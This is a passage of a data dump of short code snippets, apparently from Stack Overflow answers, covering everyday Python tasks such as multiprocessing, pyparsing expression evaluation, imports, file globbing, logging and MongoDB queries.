            for subvalue in traverse(value):
                yield subvalue
    else:
        yield o
</snippet></ROW><ROW><id>11951592</id><snippet>form.message.errors</snippet></ROW><ROW><id>11951592</id><snippet>'errors'</snippet></ROW><ROW><id>11951592</id><snippet>&lt;div class="field errors"&gt;
</snippet></ROW><ROW><id>11951730</id><snippet>itertools.starmap</snippet></ROW><ROW><id>11951730</id><snippet>list</snippet></ROW><ROW><id>11951730</id><snippet>list(itertools.starmap(func, [("fall", "2007")]))
</snippet></ROW><ROW><id>11951819</id><snippet>#!/usr/bin/env python
from multiprocessing import Process
import os
import time
import datetime
def sleeper(name, seconds):
   time.sleep(seconds)
   print "PNAME:- %s"%name


if __name__ == '__main__':
   pros={}
   processes=[]
   i=0
   time2=0
   time1=datetime.datetime.now()
   for sec in range(5):
        flag=0
        while flag!=1:
                time2=datetime.datetime.now()
                if (time2-time1).seconds==1:
                        time1=time2
                        flag=1
                        print "Executing Per second"
                        for no in range(5):
                                i+=1
                                pros[i] = Process(target=sleeper, args=("Thread-%d"%i, 1))
                        j=i-5
                        for no in range(5):
                                j+=1
                                pros[j].start()
                        j=i-5
                        for no in range(5):
                                j+=1
                                processes.append(pros[j])
   for p in processes:
        p.join()
</snippet></ROW><ROW><id>11952026</id><snippet>spam</snippet></ROW><ROW><id>11952026</id><snippet>spam.py</snippet></ROW><ROW><id>11952026</id><snippet>sys.path</snippet></ROW><ROW><id>11952026</id><snippet>sys.path</snippet></ROW><ROW><id>11952026</id><snippet>PYTHONPATH</snippet></ROW><ROW><id>11952026</id><snippet>PATH</snippet></ROW><ROW><id>11952026</id><snippet>sys.path</snippet></ROW><ROW><id>11952026</id><snippet>from mypackage.a import *</snippet></ROW><ROW><id>11952026</id><snippet>.</snippet></ROW><ROW><id>11952026</id><snippet>..</snippet></ROW><ROW><id>11952026</id><snippet>from . import echo
from .. import formats
from ..filters import equalizer
</snippet></ROW><ROW><id>11952119</id><snippet>_Znaj</snippet></ROW><ROW><id>11952119</id><snippet>operator new[](unsigned int)</snippet></ROW><ROW><id>11952119</id><snippet>$ c++filt _Znaj
operator new[](unsigned int)
</snippet></ROW><ROW><id>11952188</id><snippet>glob</snippet></ROW><ROW><id>11952188</id><snippet>fnmatch.fnmatch()</snippet></ROW><ROW><id>11952188</id><snippet>for root, dirs, files in os.walk('D:\\Scratch'):
  for file in files:
    if fnmatch.fnmatch(file, '*.txt'):
      print os.path.join(root, file)
</snippet></ROW><ROW><id>11952251</id><snippet>/^([^\d\s]+?)\s*(\d+)[stndrh]+,\s*2012$/</snippet></ROW><ROW><id>11952251</id><snippet>/(?:([a-z]{3,9})\s*(\d{1,2})[stndrh]{2},\s*2012)/</snippet></ROW><ROW><id>11952343</id><snippet>from __future__ import division
import pyparsing as pyp
import math
import operator

class NumericStringParser(object):
    '''
    Most of this code comes from the fourFn.py pyparsing example
    http://pyparsing.wikispaces.com/file/view/fourFn.py
    http://pyparsing.wikispaces.com/message/view/home/15549426
    __author__='Paul McGuire'

    All I've done is rewrap Paul McGuire's fourFn.py as a class, so I can use it
    more easily in other places.
    '''
    def pushFirst(self, strg, loc, toks ):
        self.exprStack.append( toks[0] )
    def pushUMinus(self, strg, loc, toks ):
        if toks and toks[0] == '-':
            self.exprStack.append( 'unary -' )
    def __init__(self):
        """
        expop   :: '^'
        multop  :: '*' | '/'
        addop   :: '+' | '-'
        integer :: ['+' | '-'] '0'..'9'+
        atom    :: PI | E | real | fn '(' expr ')' | '(' expr ')'
        factor  :: atom [ expop factor ]*
        term    :: factor [ multop factor ]*
        expr    :: term [ addop term ]*
        """
        point = pyp.Literal( "." )
        e     = pyp.CaselessLiteral( "E" )
        fnumber = pyp.Combine( pyp.Word( "+-"+pyp.nums, pyp.nums ) + 
                           pyp.Optional( point + pyp.Optional( pyp.Word( pyp.nums ) ) ) +
                           pyp.Optional( e + pyp.Word( "+-"+pyp.nums, pyp.nums ) ) )
        ident = pyp.Word(pyp.alphas, pyp.alphas+pyp.nums+"_$")       
        plus  = pyp.Literal( "+" )
        minus = pyp.Literal( "-" )
        mult  = pyp.Literal( "*" )
        div   = pyp.Literal( "/" )
        lpar  = pyp.Literal( "(" ).suppress()
        rpar  = pyp.Literal( ")" ).suppress()
        addop  = plus | minus
        multop = mult | div
        expop = pyp.Literal( "^" )
        pi    = pyp.CaselessLiteral( "PI" )
        expr = pyp.Forward()
        atom = ((pyp.Optional(pyp.oneOf("- +")) +
                 (pi|e|fnumber|ident+lpar+expr+rpar).setParseAction(self.pushFirst))
                | pyp.Optional(pyp.oneOf("- +")) + pyp.Group(lpar+expr+rpar)
                ).setParseAction(self.pushUMinus)       
        # by defining exponentiation as "atom [ ^ factor ]..." instead of 
        # "atom [ ^ atom ]...", we get right-to-left exponents, instead of left-to-right
        # that is, 2^3^2 = 2^(3^2), not (2^3)^2.
        factor = pyp.Forward()
        factor &lt;&lt; atom + pyp.ZeroOrMore( ( expop + factor ).setParseAction(
            self.pushFirst ) )
        term = factor + pyp.ZeroOrMore( ( multop + factor ).setParseAction(
            self.pushFirst ) )
        expr &lt;&lt; term + pyp.ZeroOrMore( ( addop + term ).setParseAction( self.pushFirst ) )
        self.bnf = expr
        # map operator symbols to corresponding arithmetic operations
        epsilon = 1e-12
        self.opn = { "+" : operator.add,
                "-" : operator.sub,
                "*" : operator.mul,
                "/" : operator.truediv,
                "^" : operator.pow }
        self.fn  = { "sin" : math.sin,
                "cos" : math.cos,
                "tan" : math.tan,
                "abs" : abs,
                "trunc" : lambda a: int(a),
                "round" : round,
                "sgn" : lambda a: abs(a)&gt;epsilon and cmp(a, 0) or 0}
        self.exprStack = []
    def evaluateStack(self, s ):
        op = s.pop()
        if op == 'unary -':
            return -self.evaluateStack( s )
        if op in "+-*/^":
            op2 = self.evaluateStack( s )
            op1 = self.evaluateStack( s )
            return self.opn[op]( op1, op2 )
        elif op == "PI":
            return math.pi # 3.1415926535
        elif op == "E":
            return math.e  # 2.718281828
        elif op in self.fn:
            return self.fn[op]( self.evaluateStack( s ) )
        elif op[0].isalpha():
            return 0
        else:
            return float( op )
    def eval(self, num_string, parseAll = True):
        self.exprStack = []
        results = self.bnf.parseString(num_string, parseAll)
        val = self.evaluateStack( self.exprStack[:] )
        return val

nsp = NumericStringParser()
print(nsp.eval('1+2'))
# 3.0

print(nsp.eval('2*3-5'))
# 1.0
</snippet></ROW><ROW><id>11952825</id><snippet>clean_*</snippet></ROW><ROW><id>11952825</id><snippet>clean_first_name</snippet></ROW><ROW><id>11952825</id><snippet>None</snippet></ROW><ROW><id>11952825</id><snippet>NULL</snippet></ROW><ROW><id>11952837</id><snippet>for</snippet></ROW><ROW><id>11952837</id><snippet>while</snippet></ROW><ROW><id>11952837</id><snippet>if</snippet></ROW><ROW><id>11952837</id><snippet>for</snippet></ROW><ROW><id>11952860</id><snippet>lxml</snippet></ROW><ROW><id>11952973</id><snippet>def recurse(max, _output=None):
    if _output is None:
        _output = []

    #do some work here, add to your list
    _output.append(max)

    if max &lt;= 0: #Some condition where the recursion stops
        return _output
    else:        #recurse with new arguments so that we'll stop someday...
        return recurse(max-1, _output=_output)
</snippet></ROW><ROW><id>11952973</id><snippet>True</snippet></ROW><ROW><id>11952973</id><snippet>_output</snippet></ROW><ROW><id>11952973</id><snippet>result</snippet></ROW><ROW><id>11952973</id><snippet>result = []</snippet></ROW><ROW><id>11953297</id><snippet>offset = dz + np.abs(dz.min())
fracs = offset.astype(float)/offset.max()
norm = colors.normalize(fracs.min(), fracs.max())
colors = cm.jet(norm(fracs))

ax.bar3d(xpos,ypos,zpos,1,1,dz, color=colors)
</snippet></ROW><ROW><id>11953356</id><snippet>x = 3
def f( x=x ): 
    return x

x = 7
f()  # 3
</snippet></ROW><ROW><id>11953565</id><snippet>service.management().profiles().list(
          accountId=firstAccountId,
          webPropertyId=firstWebpropertyId).execute()
</snippet></ROW><ROW><id>11953565</id><snippet>profiles.get('items')</snippet></ROW><ROW><id>11953640</id><snippet>    import os.path
    sURL = os.path.realpath('.')
    print 'sURL = ' + sURL + '&lt;br /&gt;'
</snippet></ROW><ROW><id>11953883</id><snippet>from glob import glob
import os

files_list = glob(os.path.join(my_folder, '*.dat'))
for a_file in sorted(files_list):
  # do whatever with the file
  # 'open' or 'with' statements depending on your python version
</snippet></ROW><ROW><id>11954121</id><snippet>t.join
</snippet></ROW><ROW><id>11954121</id><snippet>t.join()
</snippet></ROW><ROW><id>11954121</id><snippet>t.join</snippet></ROW><ROW><id>11954121</id><snippet>bound method</snippet></ROW><ROW><id>11954242</id><snippet>def flatten(lst):
    for element in lst:
        if isinstance(element, list):
            for subelement in flatten(element):
                yield subelement
        else:
            yield element
</snippet></ROW><ROW><id>11954242</id><snippet>l</snippet></ROW><ROW><id>11954242</id><snippet>set(flatten(l))
</snippet></ROW><ROW><id>11954250</id><snippet>$ PGPASSWORD=mypassword pg_dump -Fc --no-acl --no-owner -h myhost -U myuser mydb &gt; mydb.dump</snippet></ROW><ROW><id>11954367</id><snippet>pyramid==1.0.1
...
</snippet></ROW><ROW><id>11954367</id><snippet>pip install -r requirements.txt
</snippet></ROW><ROW><id>11954588</id><snippet>for excluded in excludeList:
    kolaDataList = filter(lambda l: excluded not in l, kolaDataList)
</snippet></ROW><ROW><id>11954588</id><snippet>for excluded in excludeList:
    kolaDataList = [l for l in kolaDataList if excluded not in l]
</snippet></ROW><ROW><id>11955203</id><snippet>&gt;&gt;&gt; FList = ["Mary Smith", "Kevin Bacon"]
&gt;&gt;&gt; JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
&gt;&gt;&gt; ultralist = []
&gt;&gt;&gt; for item in FList:
    for row in JG:
        if row[1] == item:
            ultralist.append(row)


&gt;&gt;&gt; ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']]
</snippet></ROW><ROW><id>11955203</id><snippet>&gt;&gt;&gt; FList = ["Mary Smith", "Kevin Bacon"]
&gt;&gt;&gt; JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
&gt;&gt;&gt; ultralist = []
&gt;&gt;&gt; for row in JG:
        if row[1] in FList:
                ultralist.append(row)


&gt;&gt;&gt; ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']]
</snippet></ROW><ROW><id>11955203</id><snippet>JG</snippet></ROW><ROW><id>11955203</id><snippet>JG</snippet></ROW><ROW><id>11955203</id><snippet>FList</snippet></ROW><ROW><id>11955203</id><snippet>FList</snippet></ROW><ROW><id>11955203</id><snippet>row[1]</snippet></ROW><ROW><id>11955203</id><snippet>row[1] in FList</snippet></ROW><ROW><id>11955203</id><snippet>set</snippet></ROW><ROW><id>11955203</id><snippet>FList</snippet></ROW><ROW><id>11955203</id><snippet>&gt;&gt;&gt; FList = set(["Mary Smith", "Kevin Bacon"])
&gt;&gt;&gt; JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
&gt;&gt;&gt; ultralist = []
&gt;&gt;&gt; for row in JG:
        if row[1] in FList:
                ultralist.append(row)


&gt;&gt;&gt; ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']]
</snippet></ROW><ROW><id>11955203</id><snippet>in</snippet></ROW><ROW><id>11955203</id><snippet>&gt;&gt;&gt; FList = set(["Mary Smith", "Kevin Bacon"])
&gt;&gt;&gt; JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
&gt;&gt;&gt; ultralist = [row for row in JG if row[1] in FList]
&gt;&gt;&gt; ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']]
</snippet></ROW><ROW><id>11955650</id><snippet>offset</snippet></ROW><ROW><id>11955650</id><snippet>disabled</snippet></ROW><ROW><id>11955650</id><snippet>import Tkinter as tk
class SampleApp(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        l = tk.Text(self, width=5, height=2, borderwidth=0, 
                    background=self.cget("background"))
        l.tag_configure("subscript", offset=-4)
        l.insert("insert", "H", "", "2", "subscript", "O")
        l.configure(state="disabled")
        l.pack(side="top")

if __name__ == "__main__":
    app = SampleApp()
    app.mainloop()
</snippet></ROW><ROW><id>11955701</id><snippet>xlrd</snippet></ROW><ROW><id>11955701</id><snippet>import os
import tempfile
import shutil
from contextlib import contextmanager

@contextmanager
def tempinput(file_):
    temp = tempfile.NamedTemporaryFile(delete=False)
    shutil.copyfileobj(file_, temp)
    temp.close()
    yield temp.name
    os.unlink(temp.name)

with tempinput(request.params['xls_file'].file) as tempfilename:
    workbook = xlrd.open_workbook(tempfilename)
</snippet></ROW><ROW><id>11955701</id><snippet>with</snippet></ROW><ROW><id>11955772</id><snippet>values, vectors = scipy.sparse.linalg.eigs(P, k=1, sigma=1)
</snippet></ROW><ROW><id>11955904</id><snippet>__init__.py</snippet></ROW><ROW><id>11955929</id><snippet>error</snippet></ROW><ROW><id>11955929</id><snippet>warn</snippet></ROW><ROW><id>11955929</id><snippet>info</snippet></ROW><ROW><id>11955929</id><snippet>__str__</snippet></ROW><ROW><id>11955929</id><snippet>info</snippet></ROW><ROW><id>11955929</id><snippet>logging</snippet></ROW><ROW><id>11955929</id><snippet>class Logger(Filterer):
    # snip
    def debug(self, msg, *args, **kwargs):
        # snip
        if self.isenabledfor(debug):
            self._log(debug, msg, args, **kwargs)
</snippet></ROW><ROW><id>11955929</id><snippet>msg</snippet></ROW><ROW><id>11955929</id><snippet>args</snippet></ROW><ROW><id>11955929</id><snippet>log</snippet></ROW><ROW><id>11955929</id><snippet>__str__</snippet></ROW><ROW><id>11955929</id><snippet>$ python -m timeit -n 1000000 -s "import logging" -s "logger = logging.getLogger('foo')" -s "logger.setLevel(logging.ERROR)" "logger.warn('%s', range(0,100))"
1000000 loops, best of 3: 1.52 usec per loop
$ python -m timeit -n 1000000 -s "import logging" -s "logger = logging.getLogger('foo')" -s "logger.setLevel(logging.ERROR)" "logger.warn('%s' % range(0,100))"
1000000 loops, best of 3: 10.4 usec per loop
</snippet></ROW><ROW><id>11955994</id><snippet>dict</snippet></ROW><ROW><id>11955994</id><snippet>dict</snippet></ROW><ROW><id>11955994</id><snippet>dict</snippet></ROW><ROW><id>11955994</id><snippet>def defaultArgs(default_kw):
    "decorator to assign default kwargs"
    def wrap(f):
        def wrapped_f(**kwargs):
            kw = {}
            kw.update(default_kw)  # apply defaults
            kw.update(kwargs)  # apply from input args
            f(**kw)  # run actual function with updated kwargs
        return wrapped_f
    return wrap
</snippet></ROW><ROW><id>11955994</id><snippet>defaults = {'foo':0, 'bar':1, 'baz':2}

@defaultArgs(defaults)
def func(**kwargs):
    print kwargs  # args accessible via the kwargs dict
</snippet></ROW><ROW><id>11955994</id><snippet>func()  # prints {'baz': 2, 'foo': 0, 'bar': 1}
func(foo=2)  # prints {'baz': 2, 'foo': 2, 'bar': 1}

params = {'bar':1000, 'hello':'world'}
func(**params)  # prints {'baz': 2, 'foo': 0, 'bar': 1000, 'hello': 'world'}
</snippet></ROW><ROW><id>11955994</id><snippet>func(1, 2, 3)   # raises TypeError
</snippet></ROW><ROW><id>11956382</id><snippet>delete-event</snippet></ROW><ROW><id>11956382</id><snippet>destroy</snippet></ROW><ROW><id>11956382</id><snippet>destroy</snippet></ROW><ROW><id>11956382</id><snippet>return True</snippet></ROW><ROW><id>11956382</id><snippet>delete-event</snippet></ROW><ROW><id>11956556</id><snippet>if mercury or mercury2 in ans:
</snippet></ROW><ROW><id>11956556</id><snippet>True</snippet></ROW><ROW><id>11956556</id><snippet>mercury</snippet></ROW><ROW><id>11956556</id><snippet>True</snippet></ROW><ROW><id>11956556</id><snippet>mercury2 in ans</snippet></ROW><ROW><id>11956556</id><snippet>True</snippet></ROW><ROW><id>11956556</id><snippet>mercury</snippet></ROW><ROW><id>11956556</id><snippet>mercury = "57.9"</snippet></ROW><ROW><id>11956556</id><snippet>True</snippet></ROW><ROW><id>11956556</id><snippet>bool("57.9")</snippet></ROW><ROW><id>11956556</id><snippet>True</snippet></ROW><ROW><id>11956556</id><snippet>False</snippet></ROW><ROW><id>11956556</id><snippet>if mercury in ans or mercury2 in ans:
</snippet></ROW><ROW><id>11956556</id><snippet>if ans in [mercury, mercury2]:
</snippet></ROW><ROW><id>11956688</id><snippet>data = jsDat.get('data')
data = data.encode('ascii', 'ignore')
</snippet></ROW><ROW><id>11957283</id><snippet>    # for Linux
    TEMPLATE_DIRS = (
        '/home/djangouser/projects/myproject/templates/',
    )

    # or for Windows; use forward slashes!
    TEMPLATE_DIRS = (
        'C:/projects/myproject/templates/',
    )
</snippet></ROW><ROW><id>11957283</id><snippet># add at the beginning of settings.py
import os

# ...

TEMPLATE_DIRS = (
    os.path.join(PROJECT_ROOT, 'templates/'),
)
</snippet></ROW><ROW><id>11957338</id><snippet>intersection_set = set.intersection(*map(set, taxa))
intersection_lst = [t for t in taxa[0] if t in intersection_set]
</snippet></ROW><ROW><id>11957338</id><snippet>sorted(set.intersection(*map(set, taxa)), key=lambda x: taxa[0].index(x))
</snippet></ROW><ROW><id>11957424</id><snippet>plt.xlabel(r'$\rho A_i$')
</snippet></ROW><ROW><id>11957431</id><snippet>&gt;&gt;&gt; s = u'Oye , si te parece quedamos en El Corte Inglés de Nuevos Ministerios este martes , a las 18:30 , y me ayudas con las compras , te parece los sofás no
sé si comprarlos en Zara Home o en la web , que es http://zara-home.es . De todas maneras , dame un toque al +00 000 000 000 y lo hablamos. Te dejo también mi c
orreo , username@domain .com. Venga , hasta luego.'
&gt;&gt;&gt; import re
&gt;&gt;&gt; s = re.sub(r'\s+([,.])', r'\1', s)
&gt;&gt;&gt; print s
Oye, si te parece quedamos en El Corte Inglés de Nuevos Ministerios este martes, a las 18:30, y me ayudas con las compras, te parece los sofás no sé si comprarl
os en Zara Home o en la web, que es http://zara-home.es. De todas maneras, dame un toque al +00 000 000 000 y lo hablamos. Te dejo también mi correo, username@d
omain.com. Venga, hasta luego.
&gt;&gt;&gt;
</snippet></ROW><ROW><id>11957525</id><snippet>loggingsetup</snippet></ROW><ROW><id>11957525</id><snippet>logging</snippet></ROW><ROW><id>11957525</id><snippet>import logging

# set up logging config here

from logging import *
</snippet></ROW><ROW><id>11957525</id><snippet>import loggingsetup as logging
</snippet></ROW><ROW><id>11957525</id><snippet>loggingsetup</snippet></ROW><ROW><id>11957525</id><snippet>tweaked_logging</snippet></ROW><ROW><id>11957525</id><snippet>logging_with_my_settings</snippet></ROW><ROW><id>11957629</id><snippet>python</snippet></ROW><ROW><id>11957746</id><snippet>start = datetime.datetime(2012, 2, 2, 6, 35, 6, 764)
end = datetime.datetime(2012, 2, 2, 6, 55, 3, 381)

for doc in db.wing_model.find({'time': {'$gte': start, '$lt': end}}):
    print doc
</snippet></ROW><ROW><id>11957787</id><snippet>from registration.signals import user_activated, user_registered

user_registered.connect(&lt;Hook your add email to celery task queue&gt; )
</snippet></ROW><ROW><id>11957797</id><snippet>import xlwt
class MyWorkbook:
    ''' allow access to a workbooks sheets'''
    def __init__(self,*args,**kwargs):
        self.wb = xlwt.Workbook(*args,**kwargs)
        self.sheets = []
    def add_sheet(self,sheet_name):
        self.sheets.append(self.wb.add_sheet(sheet_name))
        return self.sheets[-1]
    def GetSheetByIndex(self,n):
        return self.sheets[n]
    def save(self,fname_or_stream):
        return self.wb.save(fname_or_stream)

def CreateWB():
    ''' return a MyWorkbook instance with 1 sheet'''
    m= MyWorkbook()
    m.add_sheet("first_sheet")
    return m
def ModifySheet0(mwb):
    '''uses instance of MyWorkbook and modifies sheet0'''
    s = mwb.GetSheetByIndex(0)
    s.write(0,0,"Hello World!")
def DoItAll()
    '''passing around MyWorkbook'''
    wb = CreateWB()
    ModifySheet0(wb)
    wb.save("somefile.xls")
</snippet></ROW><ROW><id>11958177</id><snippet>namespaces</snippet></ROW><ROW><id>11958177</id><snippet>from module import thing</snippet></ROW><ROW><id>11958177</id><snippet>thing</snippet></ROW><ROW><id>11958177</id><snippet>module</snippet></ROW><ROW><id>11958177</id><snippet>mod1</snippet></ROW><ROW><id>11958177</id><snippet>from mod2 import test #Import mod2, bring test function into current module namespace
test("mod1.py")  #run the test function (defined in mod2)
</snippet></ROW><ROW><id>11958177</id><snippet>#create a new function named 'test' in the current (mod2) namespace 
#the first time this module is imported.  Note that this function has
#access to the entire namespace where it is defined (mod2).
def test(name):  
    print 'loading...'
    countLines(name)
    countChars(name)
    print '-'*10
</snippet></ROW><ROW><id>11958177</id><snippet>module1</snippet></ROW><ROW><id>11958177</id><snippet>cool_func</snippet></ROW><ROW><id>11958177</id><snippet>module2</snippet></ROW><ROW><id>11958177</id><snippet>module2</snippet></ROW><ROW><id>11958177</id><snippet>cool_func</snippet></ROW><ROW><id>11958177</id><snippet>module3</snippet></ROW><ROW><id>11958177</id><snippet>import module1
import module2
module1.cool_func()
module2.cool_func()
</snippet></ROW><ROW><id>11958177</id><snippet>from module1 import cool_func
import module2 
cool_func() #module1
module2.cool_func()
</snippet></ROW><ROW><id>11958177</id><snippet>from module1 import cool_func as cool
from module2 import cool_func as cooler
cool()  #module1
cooler() #module2
</snippet></ROW><ROW><id>11958656</id><snippet>render_GET</snippet></ROW><ROW><id>11958656</id><snippet>NOT_DONE_YET</snippet></ROW><ROW><id>11958656</id><snippet>render_GET</snippet></ROW><ROW><id>11958656</id><snippet>None</snippet></ROW><ROW><id>11958656</id><snippet>render_GET</snippet></ROW><ROW><id>11958656</id><snippet>return</snippet></ROW><ROW><id>11958656</id><snippet>def render_GET(self, request):
    request.setHeader('Content-Disposition', ['attachment ; filename="tick_db_export.csv"'])
    return static.File.render_GET(self, request)
</snippet></ROW><ROW><id>11958656</id><snippet>NOT_DONE_YET</snippet></ROW><ROW><id>11958803</id><snippet>findall()</snippet></ROW><ROW><id>11958803</id><snippet>flags</snippet></ROW><ROW><id>11958803</id><snippet>pos</snippet></ROW><ROW><id>11958803</id><snippet>re.MULTILINE</snippet></ROW><ROW><id>11958803</id><snippet>8</snippet></ROW><ROW><id>11958862</id><snippet>cursor = db.model.find({'time': {'$gte': start, '$lt': end}})
</snippet></ROW><ROW><id>11958862</id><snippet>Cursor</snippet></ROW><ROW><id>11958862</id><snippet>find</snippet></ROW><ROW><id>11958862</id><snippet>dict</snippet></ROW><ROW><id>11958862</id><snippet>Cursor</snippet></ROW><ROW><id>11958862</id><snippet>Cursor</snippet></ROW><ROW><id>11958862</id><snippet>for result_object in cursor:
    print result_object   # result_object is a dict that holds JSON object
    result_object['_id']  # Mongo ObjectId of the result_object
    # result_object["&lt;field_name&gt;"]  # Value stored in a field named &lt;fieldname&gt;
</snippet></ROW><ROW><id>11958884</id><snippet>ind = np.argsort(C)
xx = C[ind]
yy = dist.pdf(C)[ind]
plt.plot(xx, yy, 'r')
</snippet></ROW><ROW><id>11958884</id><snippet>plt.plot(C, dist.pdf(C), 'ro')
</snippet></ROW><ROW><id>11959062</id><snippet>dict</snippet></ROW><ROW><id>11959062</id><snippet>characters = {
'1': 'Stark',
'2': 'Greyjoy',
'3': 'California',
'4': 'Whitewalkers',
'5': 'Knights Watch',
'6': 'Dalthraki',
}   

print 'Type 1 for Stark'
print 'Type 2 for Greyjoy'
print 'Type 3 for Lannister'
print 'Type 4 for Whitewalkers'
print 'Type 5 for Knights Watch'
print 'Type 6 for Dalthraki' 
choice = raw_input("&gt; ")
if choice in characters:
    print 'You\'ve selected', characters[choice] 
else:
    pass
</snippet></ROW><ROW><id>11959116</id><snippet>&gt;&gt;&gt; import itertools as it
&gt;&gt;&gt; ls = ['a', 'b', 'c', 'd']
&gt;&gt;&gt; ii=it.groupby( it.combinations(ls, 2), lambda x: x[0] )
&gt;&gt;&gt; for key, iterator in ii:
...     print key, list(iterator)
... 
a [('a', 'b'), ('a', 'c'), ('a', 'd')]
b [('b', 'c'), ('b', 'd')]
c [('c', 'd')]
</snippet></ROW><ROW><id>11959116</id><snippet>lambda</snippet></ROW><ROW><id>11959116</id><snippet>operator.itemgetter(0)</snippet></ROW><ROW><id>11959116</id><snippet>lambda x: x[0]</snippet></ROW><ROW><id>11959320</id><snippet>yourDict['b']['d']['b'] = "test"
</snippet></ROW><ROW><id>11959320</id><snippet>reduce(lambda d,i:d[i], indexList[:-1], yourDict)[indexList[-1]] = "test"
</snippet></ROW><ROW><id>11959320</id><snippet>&gt;&gt;&gt; yourDict = {'a':1, 'b':{'c':1, 'd': {'b':1}}}
&gt;&gt;&gt; indexList = ['b','d','b']

&gt;&gt;&gt; reduce(lambda d,i:d[i], indexList[:-1], yourDict)[indexList[-1]] = "test"
&gt;&gt;&gt; yourDict
{'a': 1, 'b': {'c': 1, 'd': {'b': 'test'}}}
</snippet></ROW><ROW><id>11959320</id><snippet>&gt;&gt;&gt; yourDict = {'a':1, 'b':{'c':1, 'd': {'b':1}}}
&gt;&gt;&gt; indexList=['a']

&gt;&gt;&gt; reduce(lambda d,i:d[i], indexList[:-1], yourDict)[indexList[-1]] = "test"
&gt;&gt;&gt; yourDict
{'a': 'test', 'b': {'c': 1, 'd': {'b': 1}}}
</snippet></ROW><ROW><id>11959635</id><snippet>q</snippet></ROW><ROW><id>11959635</id><snippet>q</snippet></ROW><ROW><id>11959635</id><snippet>MyObjects.q</snippet></ROW><ROW><id>11959635</id><snippet>self.q</snippet></ROW><ROW><id>11959635</id><snippet>class MyObjects(object):
    q=0
    def __init__(self):
       MyObjects.q+=1
       self.q=MyObjects.q

    def f(self,x,y):
        return self.q*y+x
inp=input("Enter number of objects: ")
dic={}
for x in range(1,inp+1):
    dic[x]=MyObjects()
</snippet></ROW><ROW><id>11959635</id><snippet>&gt;&gt;&gt; dic[1].q
1
&gt;&gt;&gt; dic[2].q
2
&gt;&gt;&gt; dic[3].q
3
&gt;&gt;&gt; dic[1].f(2,5)
7
&gt;&gt;&gt; dic[2].f(2,5)
12
&gt;&gt;&gt; dic[3].f(2,5)
17
</snippet></ROW><ROW><id>11959958</id><snippet>simplejson</snippet></ROW><ROW><id>11959958</id><snippet>try: 
  import simplejson as json
except:
  import json
out = {'key': 'value', 'key2': 4}
print json.dumps(out)
</snippet></ROW><ROW><id>11959958</id><snippet># [...] generate dynamic data [...]
html = html + template.render (templatepath + 'outputpage_start.html', {})
html = html + template.render (templatepath + 'outputpage_js.html', {})               
html = html + """&lt;table width="500" class='out' border="1" data-dynamic="%s"&gt;""" % json.dumps(your_generated_data_dict)
#tr/td elements and templating as needet
self.response.out.write(html)
</snippet></ROW><ROW><id>11959958</id><snippet>$(function(){
    var your_generated_table = $('table'),
        dynamic_data = JSON.parse(your_generated_table.attr('data-dynamic'));
});
</snippet></ROW><ROW><id>11960473</id><snippet>functools.wraps</snippet></ROW><ROW><id>11960473</id><snippet>functools.update_wrapper</snippet></ROW><ROW><id>11960473</id><snippet>__module__</snippet></ROW><ROW><id>11960473</id><snippet>str</snippet></ROW><ROW><id>11960473</id><snippet>__module__</snippet></ROW><ROW><id>11960473</id><snippet>decorator</snippet></ROW><ROW><id>11960473</id><snippet>functools.wraps</snippet></ROW><ROW><id>11960473</id><snippet>def f(fn):
    """Converts the string fn to a function and returns it."""
    @functools.wraps(fn)
    def _f(fn):
        return eval(fn)
    return _f
</snippet></ROW><ROW><id>11960473</id><snippet>def factory(exp):
    def f(**kwargs):
        return eval(exp, globals(), kwargs)
    f.__name__ = exp
    return f 
</snippet></ROW><ROW><id>11960473</id><snippet>&gt;&gt;&gt; x_squared = factory("x**2")
&gt;&gt;&gt; x_squared(x=7)
49
</snippet></ROW><ROW><id>11960473</id><snippet>eval</snippet></ROW><ROW><id>11960694</id><snippet>quit()</snippet></ROW><ROW><id>11960694</id><snippet>exit(0)</snippet></ROW><ROW><id>11960723</id><snippet>export PYTHONPATH=$PYTHONPATH:/&lt;path_to_modules&gt;
</snippet></ROW><ROW><id>11960823</id><snippet>AuthTktAuthenticationPolicy</snippet></ROW><ROW><id>11960823</id><snippet>AuthTktAuthenticationPolicy</snippet></ROW><ROW><id>11960823</id><snippet>mod_auth_tkt</snippet></ROW><ROW><id>11960823</id><snippet>pyramid_beaker</snippet></ROW><ROW><id>11960871</id><snippet>val()</snippet></ROW><ROW><id>11960871</id><snippet>$('#id_timestamp').val($('#time').val())
</snippet></ROW><ROW><id>11960899</id><snippet>self.session['Xuser'] = users.get_current_user().user_id()
</snippet></ROW><ROW><id>11961154</id><snippet>\b(?:Q|L[A-Z])\d{8}\b
</snippet></ROW><ROW><id>11961184</id><snippet>[person:X]
Age: 12
Profession: Student
Address: 555 Tortoise Drive

[person:Y]
Age: 29
Profession: Programmer
Address: The moon
</snippet></ROW><ROW><id>11961184</id><snippet>config = ConfigParser()
config.read('people.ini')
people = []

for s in config.sections():
    if not s.startswith('person:'):
         continue

    name = s[7:]
    person = dict(config.items(s))
    person['name'] = name

    people.append(person)
</snippet></ROW><ROW><id>11961228</id><snippet>items()</snippet></ROW><ROW><id>11961228</id><snippet>zip()</snippet></ROW><ROW><id>11961228</id><snippet>for i, j in zip(dict_a.items(), dict_b.items()):
    if i == j:
        print(i)
</snippet></ROW><ROW><id>11961228</id><snippet>(1, 4)
(7, 4)
</snippet></ROW><ROW><id>11961394</id><snippet>doWhat = 'teamSearch'</snippet></ROW><ROW><id>11961394</id><snippet>values = {'doWhat':'teamSearch', 'searchOrg' : '30123','academicYear' : '2011','searchSport' : 'MBA','searchDiv' : '1'}
</snippet></ROW><ROW><id>11961460</id><snippet>import string
acceptedChars = set(string.printable)
newL = ''.join([ x for x in l if x in acceptedChars])
</snippet></ROW><ROW><id>11961460</id><snippet>set()</snippet></ROW><ROW><id>11961460</id><snippet>acceptedChars = set(string.digits + "[]()+-/*^=!&lt;&gt;" + string.letters)
newL = ''.join([ x for x in l if x in acceptedChars])
